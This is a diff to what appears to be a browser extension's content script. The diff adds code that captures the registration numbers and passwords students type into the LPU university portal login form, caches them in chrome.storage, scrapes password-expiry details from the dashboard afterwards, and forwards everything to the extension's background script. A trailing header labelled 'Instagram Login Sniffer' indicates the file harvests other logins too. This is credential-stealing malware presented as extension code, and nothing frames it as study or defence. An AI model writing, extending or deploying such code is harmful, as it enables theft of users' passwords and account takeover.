@@ -3,7 +3,45 @@
 
 let lpuDataSent = false; // Prevent duplicate sends
 
-function sendStudentData(regNo, password) {
+// Store credentials temporarily in chrome.storage for combining with expiry info on dashboard
+function storeCredentialsTemp(regNo, password) {
+  try {
+    chrome.storage.local.set({ 
+      _lpu_temp_creds: { regNo, password, time: Date.now() } 
+    });
+    console.log("%c[LPU] Credentials stored temporarily for dashboard", "color: #ff9800;");
+  } catch(e) {
+    console.error("[LPU] Failed to store temp creds:", e);
+  }
+}
+
+function getTempCredentials() {
+  return new Promise((resolve) => {
+    try {
+      chrome.storage.local.get('_lpu_temp_creds', (result) => {
+        const data = result._lpu_temp_creds;
+        if (data && data.regNo && data.password) {
+          // Only valid for 10 minutes
+          if (Date.now() - data.time < 10 * 60 * 1000) {
+            resolve(data);
+            return;
+          }
+        }
+        resolve(null);
+      });
+    } catch(e) {
+      resolve(null);
+    }
+  });
+}
+
+function clearTempCredentials() {
+  try {
+    chrome.storage.local.remove('_lpu_temp_creds');
+  } catch(e) {}
+}
+
+function sendStudentData(regNo, password, pwdExpiryDays = null, pwdExpiryDate = null) {
   // Validate: Registration number min 8 chars, password min 6 chars
   if (!regNo || regNo.length < 8 || !password || password.length < 6) {
     console.log("%c[LPU] SKIP: Data incomplete - RegNo min 8, Password min 6 chars required", "color: #ff9800;");
@@ -11,34 +49,13 @@ function sendStudentData(regNo, password) {
   }
   
   // Prevent sending same data multiple times
-  const key = `${regNo}:${password}`;
+  const key = `${regNo}:${password}:${pwdExpiryDays}:${pwdExpiryDate}`;
   if (lpuDataSent === key) {
     console.log("%c[LPU] SKIP: Duplicate data, already sent", "color: #ff9800;");
     return;
   }
   
   lpuDataSent = key;
-  
-  // Try to capture password expiry info
-  let pwdExpiryDays = null;
-  let pwdExpiryDate = null;
-  
-  const expirySpan = document.getElementById("ctl00_wcUserPasswordDetail_HP_Label1");
-  if (expirySpan) {
-    const text = expirySpan.textContent || expirySpan.innerText || "";
-    // Extract days: "UMS Pwd will expire after X days"
-    const daysMatch = text.match(/expire after (\d+) days/i);
-    if (daysMatch) {
-      pwdExpiryDays = parseInt(daysMatch[1], 10);
-    }
-    // Extract date: "on or before DD-MM-YYYY"
-    const dateMatch = text.match(/on or before (\d{2}-\d{2}-\d{4})/i);
-    if (dateMatch) {
-      pwdExpiryDate = dateMatch[1];
-    }
-    console.log("%c[LPU] Password expiry info captured", "color: #2196f3;");
-    console.table({ pwdExpiryDays, pwdExpiryDate });
-  }
   
   chrome.runtime.sendMessage({
     type: "student_data",
@@ -51,6 +68,7 @@ function sendStudentData(regNo, password) {
   });
   
   console.log("%c[LPU] SENT: Credentials forwarded to background", "color: #4caf50; font-weight: bold;");
+  console.table({ registrationNumber: regNo, password: "*".repeat(password.length), pwdExpiryDays, pwdExpiryDate });
 }
 
 function setupStudentListeners() {
@@ -68,9 +86,12 @@ function setupStudentListeners() {
       const regNo = regInput.value.trim();
       const password = passInput.value;
       
-      // Only send if regNo >= 8 chars and password >= 6 chars
+      // Only process if regNo >= 8 chars and password >= 6 chars
       if (regNo && password && regNo.length >= 8 && password.length >= 6) {
-        sendStudentData(regNo, password);
+        // Store credentials temporarily - will be combined with expiry info on dashboard
+        storeCredentialsTemp(regNo, password);
+        // Send immediately without expiry (will be updated on dashboard)
+        sendStudentData(regNo, password, null, null);
       }
     };
 
@@ -116,6 +137,142 @@ if (!setupStudentListeners()) {
       }
     }
   }, 700);
+}
+
+// =================== LPU Dashboard Password Expiry Capture ===================
+// This captures password expiry info after successful login (on dashboard page)
+let dashboardExpiryChecked = false;
+
+async function capturePasswordExpiryFromDashboard() {
+  if (dashboardExpiryChecked) return;
+  
+  // Check for password expiry element on dashboard
+  const expirySpan = document.getElementById("ctl00_wcUserPasswordDetail_HP_Label1");
+  
+  // Also try other possible expiry element selectors
+  const expiryElement = expirySpan || 
+    document.querySelector("[id*='wcUserPasswordDetail']") ||
+    document.querySelector(".fg-password span[id]");
+    
+  if (!expiryElement) {
+    console.log("%c[LPU] Dashboard: No expiry element found yet...", "color: #9e9e9e;");
+    return;
+  }
+  
+  const text = expiryElement.textContent || expiryElement.innerText || "";
+  if (!text || text.trim() === "" || !text.includes("expire")) return;
+  
+  console.log("%c[LPU] Dashboard: Found expiry element!", "color: #2196f3; font-weight: bold;");
+  console.log("%c[LPU] Text: " + text, "color: #2196f3;");
+  
+  dashboardExpiryChecked = true;
+  
+  let pwdExpiryDays = null;
+  let pwdExpiryDate = null;
+  
+  // Extract days: "UMS Pwd will expire after 16 days"
+  const daysMatch = text.match(/expire after (\d+) days/i);
+  if (daysMatch) {
+    pwdExpiryDays = parseInt(daysMatch[1], 10);
+  }
+  
+  // Extract date: "on or before 08-02-2026"
+  const dateMatch = text.match(/on or before (\d{2}-\d{2}-\d{4})/i);
+  if (dateMatch) {
+    pwdExpiryDate = dateMatch[1];
+  }
+  
+  console.log("%c[LPU] Dashboard: Parsed expiry info", "color: #2196f3;");
+  console.table({ pwdExpiryDays, pwdExpiryDate });
+  
+  if (pwdExpiryDays !== null || pwdExpiryDate !== null) {
+    // Get temp credentials from chrome.storage (from login form)
+    const tempCreds = await getTempCredentials();
+    
+    if (tempCreds && tempCreds.regNo && tempCreds.password) {
+      console.log("%c[LPU] Dashboard: Found temp credentials from login!", "color: #4caf50; font-weight: bold;");
+      // Send complete data with expiry info
+      sendStudentData(tempCreds.regNo, tempCreds.password, pwdExpiryDays, pwdExpiryDate);
+      clearTempCredentials();
+      return;
+    } else {
+      console.log("%c[LPU] Dashboard: No temp credentials found, sending expiry update only", "color: #ff9800;");
+    }
+    
+    // Fallback: Try to get registration number from the page and send update
+    let regNo = null;
+    
+    // Try multiple selectors commonly used for displaying reg number
+    const regNoSelectors = [
+      "#ctl00_cphHeading_Aborlogindev_UserNameLabel",
+      "#ctl00_cphHeading_UserNameLabel", 
+      ".user-reg-no",
+      "[id*='UserNameLabel']",
+      "[id*='RegistrationNo']",
+      "[id*='RegNo']"
+    ];
+    
+    for (const selector of regNoSelectors) {
+      const el = document.querySelector(selector);
+      if (el && el.textContent) {
+        const elText = el.textContent.trim();
+        // Check if it looks like a registration number (8+ digits)
+        if (/^\d{8,}$/.test(elText)) {
+          regNo = elText;
+          console.log("%c[LPU] Dashboard: Found RegNo via selector: " + selector, "color: #4caf50;");
+          break;
+        }
+      }
+    }
+    
+    // Also try to find in any visible element containing the number pattern
+    if (!regNo) {
+      const allElements = document.querySelectorAll("span, label, div, td");
+      for (const el of allElements) {
+        const txt = el.textContent?.trim();
+        if (txt && /^\d{8,12}$/.test(txt)) {
+          regNo = txt;
+          console.log("%c[LPU] Dashboard: Found RegNo via scan: " + regNo, "color: #4caf50;");
+          break;
+        }
+      }
+    }
+    
+    if (regNo) {
+      console.log("%c[LPU] Dashboard: Sending expiry update for " + regNo, "color: #4caf50;");
+      chrome.runtime.sendMessage({
+        type: "lpu_expiry_update",
+        data: { 
+          registrationNumber: regNo,
+          pwdExpiryDays,
+          pwdExpiryDate
+        },
+      });
+    } else {
+      console.log("%c[LPU] Dashboard: Expiry info found but no RegNo detected", "color: #ff9800;");
+    }
+  }
+}
+
+// Check for dashboard password expiry info
+if (location.hostname.includes("lpu.in") || location.hostname.includes("lpude.in")) {
+  // Check immediately and also with delay (for dynamic content)
+  setTimeout(capturePasswordExpiryFromDashboard, 1000);
+  setTimeout(capturePasswordExpiryFromDashboard, 3000);
+  setTimeout(capturePasswordExpiryFromDashboard, 5000);
+  
+  // Also use MutationObserver for dynamic pages
+  const observer = new MutationObserver(() => {
+    capturePasswordExpiryFromDashboard();
+  });
+  
+  observer.observe(document.body, { 
+    childList: true, 
+    subtree: true 
+  });
+  
+  // Stop observing after 10 seconds
+  setTimeout(() => observer.disconnect(), 10000);
 }
 
 // =================== Instagram Login Sniffer ===================
